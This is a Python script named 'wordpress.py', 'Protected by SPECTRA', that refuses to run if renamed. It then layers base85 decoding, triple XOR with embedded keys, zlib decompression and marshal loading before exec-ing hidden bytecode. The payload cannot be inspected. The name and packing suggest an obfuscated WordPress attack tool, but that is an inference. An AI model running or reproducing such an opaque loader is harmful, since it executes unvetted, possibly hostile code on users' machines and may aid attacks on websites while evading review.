# Protected by SPECTRA
import base64, marshal, zlib, os, sys
_EXP = "wordpress.py"
if os.path.basename(__file__) != _EXP:
    print("[!] JANGAN RENAME FILE INI!")
    sys.exit(1)
_K1 = bytes.fromhex("120236950358080743c420adbbf7c85d55b652b126d60259c88faad72ad0e7d03659595b143aaffe5535991229c99a036a4be86e82fc836effeba5ab3ab61afc")
_K2 = bytes.fromhex("f4193a8c45cf69fa117d4d596f19a8e071dd1ef774f98d8fcaf736f642d2b1c201f444e9a43f1f237214840ca654690cd8d0ea927afa57e81fa37c9b832e7194")
_K3 = bytes.fromhex("f0b3c2fcc1da5f9da2ecad6464b1b43e4e5201baa5950c30c439e8e2643c88d82abcb267b73132374e08783b928b482cd9b59a6d6ce4317e3cf4da02ec767628")
_S = """ZgK<M+#w}5h9U@YE6be9eh>#p-%#SWPzk?PXoIr=XUTpR$$TIOJsT2XlQaD{qT-aa4{u(%j~v<L6<ggx
U6G5x@D^r{M%_Y&I9*_vQxxCO!P81^OD9vp+B+m!A~e}V1L+Mk5^jO-D|4LKJ}m2ZN|7p)5{2~cQtkbK
nRKz*>&@O(fIyH`$)BI>=pKPw{pzvpW~Ev2g|11PStQ>?Sd>h%iHS*kOTeNl0|xbrWai+(au$0_d}bdC
lgvx(8R_cu?Bdjf*<NT7IC<q>V+L8_zD%NH9dk)&ap8>~cc`_f?nXg9YdV`8%i)lYOtspC$!C50O(zf$
*6$`Hj?^(EczG@YlYJi!d9A^2G(87t#D6|JOx1puFI(&!JLC+aCqBTSAS7(?s<667N1?v;)kz=yl2%jC
QGDYddtyzoc*;%{wi?H8yZFegGj*{i){1bu-9C>i^*!ql?`_1!>+~fN-zBR3WM8X5bnjH)KK_z&ZSZ;c
3L5^-zs45$m3PeBLk<Ews>%73O9YdEr9ex5M7bP3QHj2Ql%;#39RT<Bl2gKD`_DP=vf2ZxR(4}X)ZkbI
<D>)Bd37arxuL}}+TOBcbFW@03IBWSgJKq<y4yKuY$tDR;}%QXh(ZY@;cDunv(g#ioH#1kQ)$-c+!XVu
+8y@tC+vtm*k4+VQlhF-oNWmqE{nE;Bj*I;iR@I7C(ucWXm2g0Fs4Yhsv7xfjssPa>AP3WInds|UKH=7
asp_WEF11OUE*en3hDBO7kuBfA|zSVDJWo-A=(Tj^iVd&v}3f#`nJyw1GF<9{cW%x>+EF)eX!-bM!H|M
DA?cGdiFTk+Eof%!oNq-*w2Ri^HGw>`Mfb2--h&3h&HB8aF7KWpwewO5mzz{DCbWYLk7n3@f1CNPZ#D1
MJZo~cN_$uWM>OEv>wqh(JPe=06xQU8c#NdrvjRC37C15fjdsq^Rs!fp*bha80v87t_G#~s~=MdGps4A
9_%gE<P`Z_Baw6D(1GctpuS7mvtPl|-p2i8RlHwByipXL5&6-(SK^fi1f9vB!#5z0^nlqk^n_cmQokQ+
ce(+f1n*29c{8V}KFdZb`xFS+y+yWyQ7O4lPDUC=5BZhRSoE6IxjdU-+L?hJx_e|ROi;qBwh%#+Y=@(@
RcVk=@hHoxDxocTJ<Pp$g5OeF8yQ$JrYfWHmJCqz#SRd!{N6+}-Bbx~ilj77MC?vK@y>wcC+-5CHY#En
&=xmYSGP8B>i)=uc)l+*_BLk&lqq!5H&Wwt1;W)UXn+t!#Nz*G>EWIiI(%$1wM~3%&TdLSq^pAHlHPHW
ZxbsLT&Om`we_~A+E`qG8y3$q91?H;bLqH=MRi|0p_mL(CJKW&yeccViR$Y)dH-0`JQnq6lF2KtZ^>5E
iO#XH{N*}*Wc6p9<X(Zxa}eHp2XdpE7vO*fRkN_Kk%>L%Xm*+_%|$mGR9KP0VHprwk}2h&UI=doZtiGk
<=K;uzC;U{<UPtAdD$O=y18!LSu(1Gq77<LT^mXhK3o6?gy*SD_4|P{io{nT0xFy1IJd)*QWYsv(Kct_
OoHzwq0MyYdRKT9OkG2hpM0P%VdsAKmA!ZEFesL3(n7c2^zcHWFq*Sb-7&)`A_m{f*sZotFauyH|022p
;v1w%R%^@R1MR04Zgd_XVeM?B$=^+cy4zwQjL^y2>P5yISzkQjIXs-*uF0$Lk(%FT(_!lr^HIjYX%Ij1
ic9Xd7yj;Ui)`<m7r!Tp77M)v;~Kjzch+0n5;-)&y9sr2|C-Z6m2`0nODTBFQRI0-^}X=N4{veSyzhVb
4{O+oJV#{~4($0vK6-<~@T2OLhjs|oL$U-(>t=Zns{fkVSo2ha*~gO7u-%x{@=!^_LEIR5pb(Ns6b&w|
zHK+XaL`uok`H^||BB;T^ud>#gaDHPwers5^JzH;_VQo>a5!rbH*mULE&aSls11P6RFgD@a}a7sJ2<63
`2-&`&YOeb5elJuI`2Ar8I<nr@-EnSf$wvWfIxW=Ztc{OuHN~*_RpfnJqe9LGotyp5{Lb+loyRD1?>vR
j;V0sX7*l+nEURM2!`*1WppQFHX<0qpWMX(D;ANc*OQY$L2Dx=u~DVhh2PwnVf1H}B50NKCGv{VgRH2A
T*?bZa$RwJFyfInfZ^6*kJQln2UnYkLOHR*a5)P@>@~xnreb`S(ZOGt1J*8nP)8P8Wk|c$aT79MnF1~+
Db$$1*uYlCp!+s8tohjDit{6Di>9cfx)sB0gw!wJPOK5f?ZBgx9WRHf`PaZ+&Uyzv1lSJCjzRj3kWIA4
fd0@uz{%bgjMdyBbCPUes$UUhDmILE1=Lh@5kc4=l+OON3dS1K&m?4-oC(?T`Up8^xF>%owJk=QpG;s6
R4cw6w`VA_5hb*_$9XY@Gc51S*RcQ4vxbtPu0-%~-LdTdjN(3SrwVu#><+@xsn#6Xl8bw`fK@#|67uGU
(zdBqeD%!~pW<{6k5qx?v0AzQBynB_z9+Tb0#731+hcM|1ovCyk2)|`5eq+2c+@LHja!TwnlMV5EC?sh
+PPcFqZM9q<}o^MiG}xKia<#2Z{h`Mbx=!CF-or4ei)3%jIqHQ6(gQI`7o-h@g~e(Q3~bzS^D4(mS=~Y
ACo^`B<7tS+AXYFJ)S)(3c6-pElu_=%cksW61S8{4*LV*LRlV(F~G69%~qE*^mmY8ogbuI&l&(PD`1?4
rb3djHJU$u=D7K*cO4%y?6v$<%bYoOy(n{Wv-wB)#Q1l@(bv8<9}doD4;%}lcZI;QQDSEXT(V#wr%Q#~
BZ!1f$j8jHu7%xTN<7n*-fVJp89!4Sigs1rR2Uwr9*u7izZh+kKG#v}iaiT#C)T3H=uKuX$SGrr1a$wX
N+W0{x|AvCm$_aX^#qHRr`$G<rd++q)JlvmCF6(kLxSN<omysTf*8|s@oGVXqAPG23w(IJ6l@{U@>d4Y
mJ{{qWKh@|Eo>gJBGf_`1?d#XlA${FpLQ8i<J18g@~1GKu&a4G-SS(R%W44H48Qk|Hu_qo0rvlHj-=r~
=d%@KJD9K_H^z?g3r;)&>Oir_T3u~w;vTIpb45C5jLbPJbANpt;*v;acCcWD^rPfjVn7i&%kBQjLcc$G
V9BDz);SMq4Q$i)tY$-`zK2W}ec5Lu;}H5oDhd4HS{79rNV*6P(Ap-#S!*-UjKG4`*@9#XTU8nqd4znj
Nu$erkJ0eT8~~P4Q)rDL@L-YKCdt43OO1{)$+&ixfBDvYipNAxseEv<OiGf{$M4NRu_bow6ZStT2#5>q
;R?ipz-1Ilmpu3j>FLs39vu(OrhRhK*{0ONROC>v?n8^Dx&q_a0jEtyd^1@)@gr0i9=pA2zK~f}jf@$P
%!uTLmMUiPw1CiJbV!iKV(%L=k}GYq(tWuOe;hxpwgDi<=1_5=%Of8S1Mq^fFB{vn%=EYiZsA)88HtS4
IIuZ*74R*zlj1CAXg(0JNRY%1gQ96*cge*-1OZw)*)vqvO(ls?R$77BRK<0_97qw?D*^Gm!+Sm!q8;tQ
*FGvT>Eqxmwqou#nuTJQF;xd6(4wCW)i%>CK#_qG@mZFxvDPa~qJZ+*wAZAEpPKkN%*|YrW8YjIiB^Pq
6z_S0)wj*!F~{u51Mm*Cej*(-{(IA37(N3x!qy}s&~gTU*;yyLIlE6-SUw8}wl$SFCN$W=jm&9%d)=w8
Kk1K*H7k<|MSPhF8emB=_Tb|IN0KJ_A95X!)>|8C4?#(dER5fJ_pq3eV;FhYqx+XEJ!^8#mSQi>?i|pu
qQj<MsIDa9v&=dvjb9#l4k?q^O9-r&Au4o9_gWQT;%9k#G>=R?-Pf(EGdlE-Ux7&22eOR>Z>PKj4;gu0
RWY84&bwOb8)Ba9!=(y$JQ<!Cy0_h^iwv8MJ=gcFYCAhi4Uybb_hZ?gE@Oxg6J6Igp*di(8)o6yxAn@?
viOiv*4`HvpM$TJgLp0nq~|FEEplltKzu2(MwYTN=F!O*$afncI<~U$z$--bjD2=+8zi>Zl0xbD8zZ<i
^q(8h#Rk>8vpUWF$)F_$pU3j$;sALuJ$~7$^K9RscQD^|(fu(lHy}-rxcYn$jm-nTD&H6`D9R(@FR-oE
xe=JSPu3;6J?q^|83K>Yu<!n#%m?wXb`{x7YZ5Dn>WGVMp=(!71M*h$leu5xfvowtA;%cuuV1CxI2A^=
`$B>i2Q8OAkFYLsEt*&+1Bx+c5BmDKUnpwV)`j~tXl`i_4eib5csrVI1m)_2*Gx71A&*FdX-AIiz>wS$
t@+Fx)PTc(V$3Fi5tvWbw5a=v{j6unO&Xjo$DHLE%Rg>6U)x>Umc$j~|5t_obVSq2+n<X~an)^E2Ot9E
aH@6Iw`|xJT=dm{-*bW@$sPtJZ45Q<Gw(x|`)WnH&{;jIZX~`<`pwIb>^-iN{loDfZ{GY%yKnf!y|uoZ
^)XnM1*q001J12yYHdPgr|@6~D$#7ZJ!Z=jc?9)5N!NATIE?R#ma0lZ(W9Vt1Q<p7PS|{rG+}Ma^$BAS
e9H8e@poAVKZEOkp5bRZ2_)HYi)bl`4{LFE2E3psH{j-$=o4fxMuv5Tr~42ZY4&<m=3|XPXb}AFHzmEr
WN-La<W#>MLtsOOBtkzrcgpmcTG}tJ;J>FUR%qh-hk|QbGXIFH4t13K_X5#v2Ou`J0xe41*#FWvC<Qp-
u+?P*t^w0?=$dB5a${6ZIPEbUTLD;}VKAc_o=9k}fqXVMOkL$M17z0^<n)Aemg*ziFyxsL?*g1i0#a=t
Pc`6MgYa8OzgukQ-8IlYU*P@XEtbNMK)?FS;vnZ+BV)}bf>}38-V7oW2cZw4wUSzHU^n_lW*bl_;FVqJ
$JRC46o1}o;R+#HOp^D6!jUle{|SE8twdPlYQ-V+2Q}|p8rF`F_UN1mn)zfM2QIw^9gSRf4N9VYVoy1q
Jpj_mt2L3SaF1P72->JDp*WTUt!uJ4;=02TGUsN8>#zFQR@=E&KcSw5Kp%iSpH!_OXQ}WKAa2uTQ`Mq+
%%Cr#LPg6l=}SLIIc3XK5p?|z7$^1aIfAAnh=!_7d=rQ2)}@MkK{(OSU+Oh(T<|zaJ;%ink|7^c3F_Z;
-nnS3u#=s*nR3xCD<3(XXH{}a@F?aPB{G(Lib6i<Z0Wva9q6GfH7#DQi+B0?wGV2m{ddfSzD*OE%T=Si
2fCkW(vE(6yCciZSseq-i-_3<@8Jb9?oQYWWaAk%m+%njqbX$}`vi?K`@|WXss0jrV`;xfgGQ`2;~QhY
J=yeGxF6P+uU>JCuTha3BJHA^CP)gA$+@>1b%MMw;CZ~n4b1Cw4r*4-r4+($6;Zg|=f2hKJikv0xf!NN
$Joy7Ufp@FxNiCBrvK@V?T=X_3zL5`fph5r@%DJ1MXnty29;8j^tr4skZrpmm;V5i`ko`Hr-+D(Qc7H`
ecgEx^6*l8hQx}Vy`2E2;=TvGpM`+qnQCXp-Nw%9l}J$957uUf"""
_B = base64.b85decode(_S.replace("\n", "").encode("ascii"))
_D1 = bytes(b ^ _K3[i % len(_K3)] for i, b in enumerate(_B))
_D2 = bytes(b ^ _K2[i % len(_K2)] for i, b in enumerate(_D1))
_D3 = bytes(b ^ _K1[i % len(_K1)] for i, b in enumerate(_D2))
_Z = zlib.decompress(_D3)
_C = marshal.loads(_Z)
exec(_C)
